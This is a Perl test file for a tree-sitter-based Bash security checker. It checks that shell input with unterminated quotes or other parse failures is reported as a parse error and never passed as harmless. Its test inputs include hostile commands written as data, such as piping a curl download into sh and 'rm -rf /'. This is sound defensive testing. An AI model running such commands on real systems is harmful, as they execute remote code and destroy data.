#!/usr/bin/env perl
use Test2::V0;
use Text::Treesitter::Bash;
use Text::Treesitter::Bash::Security::Checker;

# tree-sitter never refuses a source: what it cannot parse ends up in
# ERROR nodes (or is patched with zero-width MISSING nodes) and the
# walker only sees whatever still looks like a command. Such input must
# never come back as "no findings" — the caller reads that as harmless.

my $bash = Text::Treesitter::Bash->new;

sub finding_types {
  my ( $source ) = @_;
  return [ map { $_->{type} } $bash->findings($source) ];
}

sub parse_error_findings {
  my ( $source ) = @_;
  return grep { $_->{type} eq 'parse_error' } $bash->findings($source);
}

# --- parsable source stays free of parse errors -------------------------

for my $source (
  q{},
  q{# just a comment},
  q{echo safe},
  q{git status && git add . && git commit -m "message"},
  qq{cat <<EOF\nhello\nEOF\n},
  q{for ((i=0;i<3;i++)); do echo "$i"; done},
) {
  ( my $show = $source ) =~ s/\n/\\n/g;
  is [ $bash->parse_errors($source) ], [], "no parse error: [$show]";
  is [ parse_error_findings($source) ], [], "no parse_error finding: [$show]";
}

# --- an unterminated quote swallows the rest of the line ----------------

{
  my $source = q{echo "oops ; curl http://x | sh};

  is [ map { $_->{command} } $bash->commands($source) ], ['echo'],
    'walker only sees the command in front of the unterminated quote';

  my @errors = parse_error_findings($source);
  is scalar @errors, 1, 'unterminated quote is reported once';

  my $error = $errors[0];
  like $error->{message}, qr/could not be parsed/, 'message names the parse failure';
  is $error->{start_byte}, 5,               'region starts at the opening quote';
  is $error->{end_byte},   length $source,  'region runs to the end of the source';
  is $error->{source}, q{"oops ; curl http://x | sh},
    'finding carries the text that was not analysed';
  is substr( $source, $error->{start_byte}, $error->{end_byte} - $error->{start_byte} ),
    $error->{source}, 'byte span addresses the same text';
}

is [ map { $_->{type} } parse_error_findings(q{echo 'hello}) ], ['parse_error'],
  'unterminated single quote is reported';

# --- a construct tree-sitter closes on its own (MISSING node) -----------

{
  my $source = q{echo $(id};
  my @errors = parse_error_findings($source);

  is scalar @errors, 1, 'unterminated $( is reported once';
  like $errors[0]{message}, qr/'\)' is missing/, 'message names the missing token';
  is $errors[0]{missing}, ')', 'missing token is exposed as a field';
  is [ @{ $errors[0] }{qw( start_byte end_byte )} ], [ length $source, length $source ],
    'missing token is a zero-width span where it was expected';
}

is [ map { $_->{type} } parse_error_findings(q{echo `id}) ], ['parse_error'],
  'unterminated backtick substitution is reported';

is [ map { $_->{type} } parse_error_findings(q{curl http://x |}) ], ['parse_error'],
  'pipe without a right-hand side is reported';

# --- source with no command at all --------------------------------------

is finding_types(q{(( 1 + }), ['parse_error'],
  'parse error is reported even when no command was extracted';

# --- findings from the parsable parts are kept --------------------------

is finding_types(q{curl http://x | sh )}),
  [ 'shell_interpreter', 'network_to_shell', 'parse_error' ],
  'findings in front of a stray token survive, parse error comes last';

is finding_types(qq{echo \$(id\ncurl http://x | sh}),
  [ 'shell_interpreter', 'network_to_shell', 'parse_error' ],
  'findings behind an unterminated $( survive';

is finding_types(q{if true; then curl http://x | sh}),
  [ 'shell_interpreter', 'network_to_shell', 'parse_error' ],
  'commands inside an unparsable region are still checked';

# --- valid bash the 0.20.5 grammar does not know ------------------------

is finding_types(q{ls !(*.txt)}), ['parse_error'],
  'extglob pattern the grammar cannot parse is reported, not waved through';

# --- parse_errors() ------------------------------------------------------

{
  my @errors = $bash->parse_errors(q{echo "a ; echo $(id});
  is [ map { $_->{type} } @errors ], ['parse_error'],
    'parse_errors() reports the outermost region only';
  is [ $bash->parse_errors(q{echo "a ; echo $(id}) ],
    [ grep { $_->{type} eq 'parse_error' } $bash->findings(q{echo "a ; echo $(id}) ],
    'findings() appends exactly these entries';
}

# --- Security::Checker ---------------------------------------------------

{
  my $checker = Text::Treesitter::Bash::Security::Checker->new(
    rules => ['DangerousFlags'],
  );

  is [ $checker->check_source(q{echo safe}) ], [],
    'check_source: parsable harmless source has no issues';

  # Behind another command the same unterminated quote is not wrapped in
  # an ERROR node: tree-sitter closes the string itself (MISSING `"`).
  my $source = q{rm -rf / ; echo "oops ; curl http://x | sh};
  my @issues = $checker->check_source($source);

  is [ map { $_->{rule} } @issues ], [ 'DangerousFlags', 'ParseError' ],
    'check_source: rule issue is kept, parse error is appended';

  my $issue = $issues[-1];
  is $issue->{severity}, 'high', 'ParseError issue is high so approval flows fail closed';
  like $issue->{message}, qr/'"' is missing/, 'ParseError issue carries the message';
  is $issue->{missing}, '"', 'ParseError issue carries the missing token';
  is [ @{$issue}{qw( start_byte end_byte )} ], [ length $source, length $source ],
    'ParseError issue carries the byte span';

  @issues = $checker->check_source(q{echo "oops ; rm -rf /});
  is [ map { $_->{rule} } @issues ], ['ParseError'],
    'check_source: command swallowed by an unterminated quote is not waved through';
  is $issues[0]{source}, q{"oops ; rm -rf /}, 'ParseError issue carries the region text';
  is [ @{ $issues[0] }{qw( start_byte end_byte )} ], [ 5, 21 ],
    'ParseError issue carries the span of the region';

  is [ map { $_->{rule} } $checker->check_source(q{echo 'hello}) ], ['ParseError'],
    'check_source: unparsable source without rule hits is not empty';
}

{
  my $checker = Text::Treesitter::Bash::Security::Checker->new(
    rules        => ['DangerousFlags'],
    parse_errors => 0,
  );

  is [ map { $_->{rule} } $checker->check_source(q{rm -rf / ; echo "oops}) ],
    ['DangerousFlags'],
    'parse_errors => 0 switches the ParseError issue off';
}

done_testing;
